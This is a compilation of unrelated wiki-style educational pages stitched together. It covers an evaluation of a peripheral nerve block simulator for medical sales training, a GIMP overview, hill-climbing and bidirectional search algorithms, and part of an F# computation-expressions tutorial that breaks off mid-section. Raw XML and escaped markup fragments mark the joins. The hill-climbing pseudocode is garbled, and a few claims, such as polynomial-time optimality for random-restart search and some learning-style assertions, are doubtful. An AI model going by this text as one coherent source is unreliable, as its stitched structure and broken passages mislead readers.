'''Simulation:''' Learners can practice what they have learned within the “Animation,” “Anatomy,” “Video” and Library components of the program by “doing” the interscalene block procedure on a virtual patient. The digital male patient can be positioned by the learner for the best procedural approach (Figure 16). He can be moved up and down or left and right. He can be rotated 360 degrees vertically or horizontally. It’s possible to zoom in and out of the procedural site and the patient’s skin can be made transparent to better visualize nerves, muscles and vasculature (Figure 17), or more transparent to visualize just the nerves and arteries. The learner can locate the interscalene groove by moving the cursor over the patient’s skin to identify the key anatomical landmarks. The needle puncture site can then be marked by using line and curve drawing tools, after which the stimulating needle (size) can be selected and inserted (Figure 18). The needle is advanced with the mouse when the “Technique” button is selected. Conducting the virtual procedure is extraordinarily challenging. Learners will need to constantly toggle between “Technique” and the “See” transparency feature to adjust the needle placement to achieve adequate motor response, which can be visualized by watching the patient’s muscle movement – or lack there of – on the animation on the right (Figure 19 and 20). The goal of the exercise is to get the stimulating needle as close to the appropriate nerve bundle as possible, while reducing the milli-amperage intensity of the needle, while getting adequate muscle response, without injuring the virtual patient.

== Simulator Program Evaluation ==

As we dig into whether the Lippincott Upper Limb PNB Simulator software might address the needs of our learners related to the PNB certification, live classroom instruction and peer-to-peer tutoring components of our planned curriculum, it might be helpful to share a brief overview of the collective research, of which I am an advocate, regarding cognitive information processing, multiple intelligences and deliberate practice. 

The first step of the cognitive information processing sequence is sensory input, which includes the cumulative internal and external, or environmental stimulus, experienced by a person at any given moment in time. All of this stimuli hits a sensory register, which has limited capacity. It can only accept and hold a limited amount of sensory input. The sensory input is stored for about a half a second at which point it is either processed, because we pay attention to the stimuli, or the sensory input is lost to accommodate new stimuli. Attention is the only way that sensory inputs reach conscious thought. Due to limited capacity our sales representatives selectively choose to attend to certain incoming information while simultaneously choosing to ignore other information. Selective attention is a process of allocating resources to manage limited capacity.

Sensory input that is attended to is selected for further processing and moves to the temporary (or working) memory. At this stage, files on the hard drive or concepts and information stored in the long term memory are accessed for use in making sense of the incoming information. The storage duration of sensory input in working memory is longer than the sensory register, but still a very brief 15 to 30 seconds. Working memory, like the sensory register, has limited capacity. Information is stored in working memory in small chunks of data. These chunks of data will be lost, or pushed out, every 15–30 seconds to make room for new data unless the existing data is rehearsed (practiced) or encoded into long term memory for later recall. Rehearsal is the simple act of consciously looping or repeating the sensory input for recall later, like repeating a phone number until one has the chance to write it down. Encoding, on the other hand, happens when new information in the temporary memory matches or is aligned in some way to a sales representative’s existing concepts or anchoring ideas – their past experiences and prior learning. If a sale rep’s existing long term cognitive files are connected in some way to the information in short term memory these new ideas will be relevant to the rep and provide entry points for the new information to be permentantly filed, or encoded for later recall and application as represented by the green arrows in Figure 20 (Driscoll, 2005. Linn, Davis &amp; Eylon, 2004).{{ref|Discoll2005}}{{ref|Linn2004}}

Many researchers believe that the brain is modular and retains long-term memories in multiple systems. For example one theory is that the brain is split between two memory systems; verbal and non-verbal. The verbal memory module contains verbal and auditory memory files. The non-verbal memory module contains visual memory files, tactile memory files, and olfactory memory files. Others, like I, believe in an even more granular memory filing system that separates incoming information into distinnct verbal liguistic, logical mathmatical, visual spatial, musical, body kinesthetic, intrapersonal and interpersonal files (Gardner, 2004). {{ref|Gardner2004}}I believe that the size of these distinct long term memory files is impacted to a large degree by an individual’s learning style. What this means, to those of us who wish to teach others, is that our curricular content and methodology should  seek to capture a sales rep’s attention utilizing a variety of techniques in an effort to make connections to these multiple long term files. The more long term memory files we open the better chance we have of our representatives encoding our training content into a variety of these files for later recall and application.

Finally, According to Ericsson (1993, 1995){{ref|Ericsson1993}}{{ref|Ericsson2004}}, the most important identifiable factor separating elite performance from average performance is the amount of deliberate practice undertaken over a long period of time, with an appropriate level of difficulty, while receiving informative feedback, and having opportunities for repetition and correction of errors, to attain excellence. Hard work, or effort, compels attention and facilitates the movement of instruction from short term memory to long term memory. 

Our blended teaching methodology at B. Braun Medical is informed by this research. The Lippincott Upper Limb PNB Simulator software program is transformative and aligned with our curricular approach for the following reasons:

1.The program stimulates and arouses student curiosity and interest. Instruction that offers novel, complex, or incongruous patterns in the learning environment will stimulate student interest and capture their attention. Capturing and maintaining student attention through arousal can open the pathway between temporary memory and long term memory. According to Driscoll (2005){{ref|Discoll2005}} maintaining student attention on a perceptual arousal level can be achieved by varying instructional approaches and intermittently changing the tone and tempo of instruction. The Lippincott PNB Simulator design methodology seeks to achieve a robust level of curiosity by creating real-world student-relevant problems in each learning component of the program, which can only be resolved by knowledge seeking behavior.

2.It is an active learning program, which will allow our sales representatives to learn by “doing” in the simulator component of the program. Ultimately conducting a successful peripheral nerve block procedure requires a significant level of deliberate, difficult practice, while consistently failing and receiving meaningful feedback, which will help encode relevant knowledge for latter recall. This active component of the program supports our targeted learners who have a slight dominance for a “learn by doing” preference and a higher prevalence of a body kinesthetic cognitive channel preference. In addition, the simulator aspect of the program supports 89% of our learners who state a preference for experiential learning activities. The literature suggests that the effort that our sales representatives will invest in this program will enhance their attention, encode new knowledge into long term memory and drive meaningful learning (Driscoll, 2005. Linn, Davis &amp; Eylon, 2004. Ericsson, Krampe &amp; Tesche-Rmer, 1993. Jonassen, 1999).{{ref|Discoll2005}},{{ref|Linn2004}}, {{ref|Ericsson1993}}, {{ref|Jonassen1999}}
 
3.The program leverages the multiple intelligences and multimodal learning styles of our targeted audience. Sales representatives will optimize retention (or knowledge integration) since different kinds of peripheral nerve block representations of the same material will encode the new knowledge to multiple long term memory files. For example, a verbal/linguistic, visual/spatial and intrapersonal preference learner who reads a description of the interscalene nerve block technique, can rotate a 3-D anatomical image of correct needle placement and can slowly “own” the content through personal reflection, will be more able to recall and apply this information later than the same student who only sees a video of the procedure (Linn, Davis &amp; Eylon, 2004. Gardner, 2004). {{ref|Linn2004}}, {{ref|Gardner2004}} 

4.The constructivist design of the program supports opportunities for learners to identify and then fill knowledge gaps. Jonassen suggests that student “puzzlement is the catalyst for meaning making.” This training program helps make a blind, unseen procedure “visible” in a variety of ways for a variety of learners with a diverse range of prior experiences. When a knowledge gap is identified by a student they explore their “puzzlement” in a variety of ways as they construct new knowledge (Linn, Davis &amp; Eylon, 2004. Jonassen, 1999).{{ref|Linn2004}}, {{ref|Jonassen1999}} 

5.The most successful sales representative understand their customer’s business and help them solve problems. Our non-clinical sales representatives need to have a competent understanding of the common surgical procedures that can benefit from PNBs and a good fundamental understanding of how PNBs are performed in order to have credible and productive conversations with their clinical customers. In this regard the literature suggests that the Upper Limb PNB Simulator Program is an authentic, high-fidelity, simulated learning task that is transferable to a real world selling situation. The instruction is also both intrinsically and extrinsically goal directed in that sales representatives will be intentionally immersed in their learning in order to be successful (Jonassen, 1999).{{ref|Jonassen1999}}

As a stand alone program designed for self study, the Lippincott Upper Limb Nerve Block Simulator Program doesn’t have a collaborative component. Many researchers suggest that students are naturally interpersonal learners who need to socially negotiate the knowledge construction process (Jonassen, 1999).{{ref|Jonassen1999}} I don’t think that this is always the case and in fact believe that forced collaborative learning could significantly inhibit introverted students, or intrapersonal learners, who have strong introspective and self-reflective capabilities. These kinds of students need more time to reflect, incorporate the ideas of others, and compose their contributions carefully, rather than forming imperfect (and unacceptable) arguments. That being said, we do design interpersonal collaborative components to our curricular design, but usually allow intrapersonal learners adequate preparation time for these kinds of sessions. The Lippincott Upper Limb Nerve Block Simulator Program is so deep and so complex that we could utilize it in a variety of ways for both independent and collaborative study. For example, students could be assigned one of the eleven upper limb peripheral nerve blocks for in depth self study, but also be required to teach their peers about the specific block during live classroom sessions. This approach would leverage the program to facilitate student collaboration allowing for debate in the classroom. Hearing a variety of other perspectives is often a synergistic process that yields greater understandings.

== Summary ==

The appropriate role of computer applications in education should not be focused on replacing the teacher/expert classroom facilitator, but by providing the student with mind-extension cognitive tools that enhance the totality of instruction (Jonassen, Carr &amp; Ping-Yueh, 1998). {{ref|Jonassen1998}} Active, constructive, authentic and intentional software applications like the Lippincott Upper Limb PNB Simulation Program is the type of mind-extension tool that Jonassen describes, which can act as a catalyst to promote deeper understanding. Wenglinsky (2005) also urges us to not isolate technological learning solutions, but to integrate technology (where it adds cognitive value) as a “piece of the puzzle in how teachers teach and how students learn.” {{ref|Weglinsky2005}}

If thoughtfully integrated within the clinical certification, live classroom instruction and peer-to-peer tutoring components of our planned blended PNB curriculum, the Lippincott Upper Limb PNB Simulation Program will help our novice new hire sales representatives:

• Know the most common surgical procedures in which patients and providers can benefit from peripheral nerve block (PNB) anesthesia/analgesia. 

• Enable them to describe how nerve blocks are performed including how nerve stimulators are used to locate a specific nerve, how anesthetic is administered, and the difference between single shot and continuous PNB techniques. 

• Advance their understanding of the brachial plexus anatomy and ultimately help them to have credible conversations with anesthesiologists regarding upper extremity surgical procedures.

== Introduction ==  

GIMP is a raster graphics editor available as [[open source]], free software (freeware). The key feature of GIMP (short for GNU Image Manipulation Program) is that it offers much of the same functionality and features as more widely used commercial graphics programs, such as Adobe Photoshop or Corel PaintShop Pro. This can especially attractive to educators who cite costs as a concern for avoiding utilizing commercially available photo-editing software.

GIMP is available for the Linux, Mac OSX and Windows operating systems, and has been included previously as part of certain Linux OS packages. 

== Development ==

In 1995, two University of California–Berkeley students, Spencer Kimball and Peter Mattis, began developing GIMP as a semester-long project. GIMP was originally created for UNIX systems, but supported systems such as Linux in its first release. Following the first release GIMP was rapidly adopted and a community emerged consisting of users who created tutorials, artwork and shared techniques. GIMP has been subsequently ported to many operating systems including Microsoft Windows and Mac OS X.

Mattis, who now works for Google, stated in 1999 the motivations to develop GIMP and free software   

{{cquote|You should understand that the GIMP and GTk+ (GIMP Toolkit)weren't written to fill holes in the software available under the GPL (GNU General Public License) and LGPL (GNU Library General Public License). The GIMP was started because I wanted to make a Web page. GTk was started because I was dissatisfied with Motif and wanted to see what it took to write a UI toolkit. These are purely selfish reasons. That is probably why the projects progressed so far and eventually succeeded. I find it much more difficult to work on something for extended periods of time for selfless reasons.

Think about how many vaporware projects have started because someone said, &quot;the open source community needs X to succeed.&quot; Now think about how many open source software packages are available in which the author states, &quot;I wrote Y because I needed to be able to do Z&quot; or &quot;I wrote Y because I wanted to learn how to do Z.&quot; }}  

== Description ==

===Interface===

[[File:Gimp-2.6.0.png|right|450px]]GIMP originally had a single document interface main window and several dialogue windows used for tools, color palettes, etc. Older versions of GIMP with the single document inteface have come under some criticism because the responsibility of managing additional windows was left to the operating system, thus forcing the user to place each window in a functional location. This has caused some confusion among users who cite concerns for situations where the toolbox and layer windows end up hidden behind unrelated application windows. In more recent versions, GIMP has switched to a multiple document interface, where GIMP tells desktop environments how to handle its windows.

===Functionality Comparison===

Both Photoshop and GIMP offer a common set of basic functions, but differ broadly in how these functions perform through the interface. While GIMP is a very complete and robust program, it cannot support the broad range of functions as that of Photoshop. A few examples of this are: the number and types devices that Photoshop can import from, including video; extended capabilities like 3D image editing, video animation painting and editing, plus automated technical/medical image measurements; a closely integrated organizer/browser, like Adobe Bridge; workspace commands; and an infrastructure that gives users many more options through its file commands. 

For basic photo-editing, however, GIMP compares favorably well in terms of its ability to open/import most of the basic bitmap graphic filetypes including PNG, JPG, GIF; its ability to adjust those images with crop, rotate, resize and many other transformations; its ability to make local retouches, sharpening and other image corrections; its ability to perform color and exposure/lightness corrections with a broad range of dialogs and tools; its ability to mask selective areas on an image(or layer)- only there will edits/brushstrokes apply; its ability to allow creating a stack of two or dozens of layers from other images, text, vector graphics, etc; its ability to allow filters or special effects to be applied to one or more layers including the base image; and its ability to produce output to several graphic filetypes, printers, and/or web pages/galleries.

== Transformative Potential ==
[[File:GIMPLogo.png|thumb|Wilber, the mascot of GIMP]]GIMP's price point (free) and rich feature list make it possible to transform the way students manipulate objects and images in a way that explores the nature of design - planning, organization and construction. The open-source and cross-platform features of GIMP also suggest that it is equitable in nature and that its use is not strictly governed by socio-economic constraints, provided that a computer is available.  This equitability is not limited to the school setting - any student with access to a computer outside of school would potentially be able utilize GIMP in their free-time.

== Community ==

As an open-source, cross-platform application, GIMP is well-supported by a large community of users and developers. There are several forums and user groups available to answer questions, and plenty of tutorials to help new users get started or help seasoned users hone their skills.

== Sample Activities ==

Thanks to a large user and developer community there are lots of existing tutorials on the web.  here are a few:

* [http://gimp-tutorials.net/prologo_withgimp Creating a logo with GIMP]
* [http://psdesignzone.com/arrow-style-logo-gimp-tutorial Creating another logo with GIMP]
* [http://www.techtalkz.com/guides/516015-create-urban-style-artwork-wallpaper-using-gimp.html Urban-style graphic with GIMP]

== The GIMP Mascot ==
The official mascot of GIMP, ''Wilber'' was created by Tuomas Kuosmanen at some point before September 25, 1997; since then Wilber has received additional accessories from other GIMP developers.

      <text xml:space="preserve">==Hill-Climbing as an optimization technique==

Hill climbing is an optimization technique for solving computationally hard problems. It is best used in problems with “the property that the state description itself contains all the information needed for a solution” (Russell &amp; Norvig, 2003).&lt;ref name=&quot;Russel&quot; &gt;
Russell, S. J., &amp; Norvig, P. (2004). ''Artificial Intelligence: A Modern Approach''. Upper Saddle River, NJ: Prentice Hall.
&lt;/ref&gt;
The algorithm is memory efficient since it does not maintain a search tree: It looks only at the current state and immediate future states.

Hill climbing attempts to iteratively improve the current state by means of an evaluation function. “Consider all the [possible] states laid out on the surface of a landscape. The height of any point on the landscape corresponds to the evaluation function of the state at that point” (Russell &amp; Norvig, 2003).&lt;ref name=&quot;Russel&quot; /&gt;

In contrast with other iterative improvement algorithms, hill-climbing always attempts to make changes that improve the current state. In other words, hill-climbing can only advance if there is a higher point in the adjacent landscape.

==Iterative Improvement and Hill-Climbing==

The main problem that hill climbing can encounter is that of local maxima. This occurs when the algorithm stops making progress towards an optimal solution; mainly due to the lack of immediate improvement in adjacent states. 

Local maxima can be avoided by a variety of methods: Simulated annealing tackles this issue by allowing some steps to be taken which decrease the immediate optimality of the current state. Algorithms such as simulated annealing “can sometimes make changes that make things worse, at least temporarily” (Russell &amp; Norvig, 2003).&lt;ref name=&quot;Russel&quot; /&gt; This allows for the avoidance of dead ends in the search path.

==Random-Restart Hill-Climbing==

Another way of solving the local maxima problem involves repeated explorations of the problem space. “Random-restart hill-climbing conducts a series of hill-climbing searches from randomly generated initial states, running each until it halts or makes no discernible progress” (Russell &amp; Norvig, 2003).&lt;ref name=&quot;Russel&quot; /&gt; This enables comparison of many optimization trials, and finding a most optimal solution thus becomes a question of using sufficient iterations on the data.

==Algorithm in Pseudocode==
&lt;pre&gt;
function HILL-CLIMBING(problem) returns a solution state
         inputs: problem, a problem
         static: current, a node
                 next, a node
         current &lt;— MAKE-NODE(INITIAL-STATE[problem])
         loop do
                 next— a highest-valued successor of current
                 if VALUE[next] &lt; VALUE[current] then return current
                 current *—next
         end
&lt;/pre&gt;
(Russell &amp; Norvig, 2003)&lt;ref name=&quot;Russel&quot; /&gt;

==Computational Complexity==

Since the evaluation used looks only at the current state, hill-climbing does not suffer from computational space issues. The source of its computational complexity arises from the time required to explore the problem space.

Random-restart hill-climbing can arrive at optimal solutions within polynomial time for most problem spaces. However, for some NP-complete problems, the numbers of local maxima can be the cause of exponential computational time. To address these problems some researchers have looked at using probability theory and local sampling to direct the restarting of hill-climbing algorithms. (Cohen, Greiner, &amp; Schuurmans, 1994).&lt;ref name=&quot;Cohen&quot; &gt;
Cohen, W., Greiner, R., Schuurmans, D. (1994). Probabilistic Hill-Climbing. ''Computational Learning Theory and Natural Learning Systems, Vol. II''. Edited by Hanson, S., Petsche, T., Rivest R., Kearns M. MITCogNet, Boston:1994.
&lt;/ref&gt;

==Applications==

Hill climbing can be applied to any problem where the current state allows for an accurate evaluation function. For example, the travelling salesman problem, the eight-queens problem, circuit design, and a variety of other real-world problems.
Hill Climbing has been used in inductive learning models. One such example is PALO, a probabilistic hill climbing system which models inductive and speed-up learning. Some applications of this system have been fit into “explanation-based learning systems”, and “utility analysis” models.  (Cohen, Greiner, &amp; Schuurmans, 1994).&lt;ref name=&quot;Cohen&quot; /&gt;

Hill Climbing has also been used in robotics to manage multiple-robot teams. One such example is the Parish algorithm, which allows for scalable and efficient coordination in multi-robot systems. The group of researchers designed “a team of robots [that] must coordinate their actions so as to guarantee location of a skilled evader.” (Gerkey, Thrun, &amp; Gordon, 2005).&lt;ref name=&quot;Gerkey&quot;&gt;
[http://www.ai.sri.com/~gerkey/ Gerkey, B.P.], Thrun, S., [http://www.cs.cmu.edu/~ggordon/ Gordon, G.] (2005). [http://www.cs.cmu.edu/~ggordon/gerkey-thrun-gordon.parish.pdf Parallel Stochastic Hillclimbing with Small Teams].  ''Multi-Robot Systems: From Swarms to Intelligent Automata, Volume III'', 65–77.
&lt;/ref&gt;

Their algorithm allows robots to choose whether to work alone or in teams by using hill-climbing. Robots executing Parish are therefore “collectively hill-climbing according to local progress gradients, but stochastically make lateral or downward moves to help the system escape from local maxima.” (Gerkey, Thrun, &amp; Gordon, 2005).&lt;ref name=&quot;Gerkey&quot; /&gt;

      <text xml:space="preserve">== '''Bidirectional Search''' ==

Bidirectional search is an algorithm that uses two searches occurring at the same time to reach a target goal. Bidirectional search generally appears to be an efficient graph search because instead of searching through a large tree, one search is conducted backwards from the goal and one search is conducted forward from the start. The reason that this is faster is because the trees grow exponentially by their depth and therefore two smaller trees have a smaller area than one large tree. Once both searches have been conducted, they will intersect in the middle to finish the path. The section of the search before they meet is called the main phase and after the intersection, it is called the post processing phase.It is important to note that most many bidirectional searches use a heuristic which means that there is no way to confirm whether the solution that is found is the most optimal solution.


The algorithm of a graph search goes through nodes in a graph systematically until an optimal solution is found whereas a heuristic search will only confirm some kind of solution in a short amount of time. The path of a bidirectional search is generally determined based on several different types of other searches which include:
*Breadth-first: Adds nodes to a list every time it checks for the goal node using a tree structure until it is reached
*Best-first: Will choose which node should be next using the node's score (often an f-value) which takes into account its cost and length
*A*: similar to best-first but will take into account the cost of the path from the start to the specified node as well as the cost from that node to the goal

== Search Example &amp; Pseudo Code ==
''&lt;u&gt;Road Map:&lt;/u&gt;''

[[File:RoadMap.jpg|600px|center]]&lt;b&gt;&lt;center&gt;Figure 1 : Paths from start address and goal address connect to finish the search.&lt;/b&gt;&lt;/center&gt;

The most effective map search would be bidirectional combined with A*

;posA(x, y, f)  and posB (x, y, f):Create a position to demonstration where you are at that time in both search trees  that will have an x coordinate, y coordinate and an f value to explain the cost of the path

;startPoint (coordX, coordY): Begin with a starting node with options for further travel:    Also have a list of coordinates with nodes demonstrating movement options towards goal intersection
		
;endPoint (coordX, coordY): Begin with an ending position (node) with several options that lead to it - 
Also have a list of coordinates with nodes demonstrating movement options towards start intersection
	
;if posA= posB(x, y) :This means intersection so end search

;else move posA from startpoint to the next node with the smallest f-valueA &amp;&amp; move posB from endPoint to the next node with the smallest f-valueB until the two points intersect

Notes: 
#Green nodes show the path that should be taken, red node shows hopeful intersection
#Thicker lines show higher cost, dotted line shows the separation between posA’s movement and posB’s
#f-valueA will take into account the cost from the startpoint to the posA and the cost from posA to posB
#f-valueB will take into account the cost from endPoint to posB and the cost from posB to posA

== Main problems with bidirectional search ==




1- Concrete information regarding goal state is necessary

2- Intersection is difficult to guarantee when there are many options

3- Computational storage



== Specific models / Solutions to problems ==



Although bidirectional search seems to be one of the quickest search options, there are many cases that it would not be practical. For example, if you were trying to find a lost item, there would be no way to begin a search from where you are as well as where the item is because you have no information of its location. A scenario that could however use a bidirectional search design is shown in the example above if you were trying to get from one address to another known location. 


Des Champeaux (1983) created an algorithm to overcome the intersection problem. The solution was basically to conduct two front to front searches that would ideally aim at each other. This bidirectional heuristic front to front algorithm (BHFFA) however turned out to take up too much space computationally. Another model, designed by Politowisky and Pohl (1984), was created to overcome the problems brought up by Champeaux. This algorithm, called d-Node retargeting, was able to use less computational space as well as find an effective way to meet in the middle. Using the idea suggested from Champeaux’s model, Politowisky and Pohl used a front to front design where the start node's pathway aims at the most promising node of the goal's pathway and vice versa.  Unfortunately, more problems arouse with this algorithm because it could only be used for inadmissible heuristics, and even then, the solution was not always clear enough. When a search algorithm is admissible, it means that the search will end in a branch with the lowest cost.


Ghosh and Mehanti (1991) then attempted to solve these problems with the suggestion of yet another front to front heuristic algorithm for bi-directional search. This algorithm used predefined parameters that cut down on computer storage. Their algorithm was a combination of breadth-first and best-first search. The 15-puzzle was chosen to test their algorithm. The 15-puzzle consists of a board of tiles with random numbers placed on them and the search system must go through and place the tiles in order. The results showed that their algorithm was the most successful of the previously mentioned algorithms when judging the quality of solutions.

{{fsharpTitle|Computation Expressions}}

'''Computation expressions''' are easily the most difficult, yet most powerful language constructs to understand in F#.

== Monad Primer ==
Computation expressions are inspired by Haskell monads, which in turn are inspired by the mathematical concept of a monads in category theory. To avoid all of the abstract technical and mathematical theory underlying monads, a &quot;monad&quot; is, in very simple terms, a scary sounding word which means ''execute this function and pass its return value to this other function''.

: '''Note:''' The designers of F# use term &quot;computation expression&quot; and &quot;workflow&quot; because it's less obscure and daunting than the word &quot;monad.&quot; The author of this book prefers &quot;monad&quot; to emphasize the parallel between the F# and Haskell (and, strictly as an aside, it's just a neat sounding five-dollar word).

'''Monads in Haskell'''

Haskell is interesting because it's a functional programming language where all statements are executed lazily, meaning Haskell doesn’t compute values until they are actually needed. While this gives Haskell some unique features such as the capacity to define [http://www.haskell.org/tutorial/functions.html#tut-infinite &quot;infinite&quot; data structures], it also makes it hard to reason about the execution of programs since you can't guarantee that lines of code will be executed in any particular order (if at all).

Consequently, it's quite a challenge to do things which need to be executed in a sequence, which includes any form of I/O, acquiring locks objects in multithreaded code, reading/writing to sockets, and any conceivable action which has a side-effect on any memory elsewhere in our application. Haskell manages sequential operations using something called a monad, which can be used to simulate state in an immutable environment.

'''Visualizing Monads with F#'''

To visualize monads, let's take some everyday F# code written in imperative style:

&lt;source lang=&quot;ocaml&quot;&gt;let read_line() = System.Console.ReadLine()
let print_string(s) = printf &quot;%s&quot; s

print_string &quot;What's your name? &quot;
let name = read_line()
print_string (&quot;Hello, &quot; + name)&lt;/source&gt;

We can re-write the &lt;code&gt;read_line&lt;/code&gt; and &lt;code&gt;print_string&lt;/code&gt; functions to take an extra parameter, namely a function to execute once our computation completes. We’d end up with something that looks more like this:

&lt;source lang=&quot;ocaml&quot;&gt;let read_line(f) = f(System.Console.ReadLine())
let print_string(s, f) = f(printf &quot;%s&quot; s)

print_string(&quot;What's your name? &quot;, fun () -&gt;
    read_line(fun name -&gt;
        print_string(&quot;Hello, &quot; + name, fun () -&gt; () ) ) )&lt;/source&gt;

If you can understand this much, then you can understand any monad.

Of course, its perfectly reasonable to say ''what masochistic reason would anyone have for writing code like that? All it does it print out &quot;Hello, Steve&quot; to the console!'' After all, C#, Java, C++, or other languages we know and love execute code in exactly the order specified -- in other words, monads solve a problem in Haskell which simply doesn't exist in imperative languages. Consequently, the monad design pattern is virtually unknown in imperative languages.

However, monads are occasionally useful for modeling computations which are difficult to capture in an imperative style.


'''The Maybe Monad'''

A well-known monad, the Maybe monad, represents a short-circuited computation which should &quot;bail out&quot; if any part of the computation fails. Using a simple example, let’s say we wanted to write a function which asks the user for 3 integer inputs between 0 and 100 (inclusive) -- if at any point, the user enters an input which is non-numeric or falls out of our range, the entire computation should be aborted. Traditionally, we might represent this kind of program using the following:

&lt;source lang=&quot;ocaml&quot;&gt;let addThreeNumbers() =
    let getNum msg =
        printf &quot;%s&quot; msg
        match System.Int32.TryParse(System.Console.ReadLine()) with
        | (true, n) when n &gt;= 0 &amp;&amp; n &lt;= 100 -&gt; Some(n)
        | _ -&gt; None
    
    match getNum &quot;#1: &quot; with
    | Some(x) -&gt;
        match getNum &quot;#2: &quot; with
        | Some(y) -&gt;
            match getNum &quot;#3: &quot; with
            | Some(z) -&gt; Some(x + y + z)
            | None -&gt; None
        | None -&gt; None
    | None -&gt; None&lt;/source&gt;

: '''Note:''' Admittedly, the simplicity of this program -- grabbing a few integers -- is ridiculous, and there are many more concise ways to write this code by grabbing all of the values up front. However, it might help to imagine that &lt;code&gt;getNum&lt;/code&gt; was a relatively expensive operation (maybe it executes a query against a database, sends and receives data over a network, initializes a complex data structure), and the most efficient way to write this program requires us to bail out as soon as we encounter the ''first'' invalid value.

This code is very ugly and redundant. However, we can simplify this code by converting it to monadic style:

&lt;source lang=&quot;ocaml&quot;&gt;let addThreeNumbers() =
    let bind(input, rest) =
        match System.Int32.TryParse(input()) with
        | (true, n) when n &gt;= 0 &amp;&amp; n &lt;= 100 -&gt; rest(n)
        | _ -&gt; None
        
    let createMsg msg = fun () -&gt; printf &quot;%s&quot; msg; System.Console.ReadLine()
    
    bind(createMsg &quot;#1: &quot;, fun x -&gt;
        bind(createMsg &quot;#2: &quot;, fun y -&gt;
            bind(createMsg &quot;#3: &quot;, fun z -&gt; Some(x + y + z) ) ) )&lt;/source&gt;

The magic is in the &lt;code&gt;bind&lt;/code&gt; method. We extract the return value from our function &lt;code&gt;input&lt;/code&gt; and pass it (or bind it) as the first parameter to &lt;code&gt;rest&lt;/code&gt;.

'''Why use monads?'''

The code above is still quite extravagant and verbose for practical use, however monads are especially useful for modeling calculations which are difficult to capture sequentially. Multithreaded code, for example, is notoriously resistant to efforts to write in an imperative style; however it becomes remarkably concise and easy to write in monadic style. Let's modify our bind method above as follows:

&lt;source lang=&quot;ocaml&quot;&gt;
open System.Threading
let bind(input, rest) =
    ThreadPool.QueueUserWorkItem(new WaitCallback( fun _ -&gt; rest(input()) )) |&gt; ignore&lt;/source&gt;

Now our bind method will execute a function in its own thread. Using monads, we can write multithreaded code in a safe, imperative style. Here's an example in fsi demonstrating this technique:

&lt;source lang=&quot;ocaml&quot;&gt;&gt; open System.Threading
open System.Text.RegularExpressions

let bind(input, rest) =
    ThreadPool.QueueUserWorkItem(new WaitCallback( fun _ -&gt; rest(input()) )) |&gt; ignore
    
let downloadAsync (url : string) =
    let printMsg msg = printfn &quot;ThreadID = %i, Url = %s, %s&quot; (Thread.CurrentThread.ManagedThreadId) url msg
    bind( (fun () -&gt; printMsg &quot;Creating webclient...&quot;; new System.Net.WebClient()), fun webclient -&gt;
        bind( (fun () -&gt; printMsg &quot;Downloading url...&quot;; webclient.DownloadString(url)), fun html -&gt;
            bind( (fun () -&gt; printMsg &quot;Extracting urls...&quot;; Regex.Matches(html, @&quot;http://\S+&quot;) ), fun matches -&gt;
                    printMsg (&quot;Found &quot; + matches.Count.ToString() + &quot; links&quot;)
                )
            )
        )
        
[&quot;http://www.google.com/&quot;; &quot;http://microsoft.com/&quot;; &quot;http://www.wordpress.com/&quot;; &quot;http://www.peta.org&quot;] |&gt; Seq.iter downloadAsync;;

val bind : (unit -&gt; 'a) * ('a -&gt; unit) -&gt; unit
val downloadAsync : string -&gt; unit

&gt;
ThreadID = 5, Url = http://www.google.com/, Creating webclient...
ThreadID = 11, Url = http://microsoft.com/, Creating webclient...
ThreadID = 5, Url = http://www.peta.org, Creating webclient...
ThreadID = 11, Url = http://www.wordpress.com/, Creating webclient...
ThreadID = 5, Url = http://microsoft.com/, Downloading url...
ThreadID = 11, Url = http://www.google.com/, Downloading url...
ThreadID = 11, Url = http://www.peta.org, Downloading url...
ThreadID = 13, Url = http://www.wordpress.com/, Downloading url...
ThreadID = 11, Url = http://www.google.com/, Extracting urls...
ThreadID = 11, Url = http://www.google.com/, Found 21 links
ThreadID = 11, Url = http://www.peta.org, Extracting urls...
ThreadID = 11, Url = http://www.peta.org, Found 111 links
ThreadID = 5, Url = http://microsoft.com/, Extracting urls...
ThreadID = 5, Url = http://microsoft.com/, Found 1 links
ThreadID = 13, Url = http://www.wordpress.com/, Extracting urls...
ThreadID = 13, Url = http://www.wordpress.com/, Found 132 links&lt;/source&gt;

Its interesting to notice that Google starts downloading on thread 5 and finishes on thread 11. Additionally, thread 11 is shared between Microsoft, Peta, and Google at some point. Each time we call &lt;code&gt;bind&lt;/code&gt;, we pull a thread out of .NET's threadpool, when the function returns the thread is released back to the threadpool where another thread might pick it up again -- its wholly possible for async functions to hop between any number of threads throughout their lifetime.

This technique is so powerful that it's baked into F# library in the form of the [[F Sharp Programming/Async Workflows|async workflow]].

== Defining Computation Expressions ==
Computation expressions are fundamentally the same concept as seen above, although they hide the complexity of monadic syntax behind a thick layer of syntactic sugar. A monad is a special kind of class which must have the following methods: &lt;code&gt;Bind&lt;/code&gt;, &lt;code&gt;Delay&lt;/code&gt;, and &lt;code&gt;Return&lt;/code&gt;.

We can rewrite our Maybe monad described earlier as follows:

&lt;source lang=&quot;ocaml&quot;&gt;type MaybeBuilder() =
    member this.Bind(x, f) =
        match x with
        | Some(x) when x &gt;= 0 &amp;&amp; x &lt;= 100 -&gt; f(x)
        | _ -&gt; None
    member this.Delay(f) = f()
    member this.Return(x) = Some x&lt;/source&gt;

We can test this class in fsi:

&lt;source lang=&quot;ocaml&quot;&gt;
&gt; type MaybeBuilder() =
    member this.Bind(x, f) =
        printfn &quot;this.Bind: %A&quot; x
        match x with
        | Some(x) when x &gt;= 0 &amp;&amp; x &lt;= 100 -&gt; f(x)
        | _ -&gt; None
    member this.Delay(f) = f()
    member this.Return(x) = Some x

let maybe = MaybeBuilder();;

type MaybeBuilder =
  class
    new : unit -&gt; MaybeBuilder
    member Bind : x:int option * f:(int -&gt; 'a0 option) -&gt; 'a0 option
    member Delay : f:(unit -&gt; 'a0) -&gt; 'a0
    member Return : x:'a0 -&gt; 'a0 option
  end
val maybe : MaybeBuilder

&gt; maybe.Delay(fun () -&gt;
    let x = 12
    maybe.Bind(Some 11, fun y -&gt;
        maybe.Bind(Some 30, fun z -&gt;
            maybe.Return(x + y + z)
            )
        )
    );;
this.Bind: Some 11
this.Bind: Some 30
val it : int option = Some 53

&gt; maybe.Delay(fun () -&gt;
    let x = 12
    maybe.Bind(Some -50, fun y -&gt;
        maybe.Bind(Some 30, fun z -&gt;
            maybe.Return(x + y + z)
            )
        )
    );;
this.Bind: Some -50
val it : int option = None
&lt;/source&gt;

=== Syntax Sugar ===

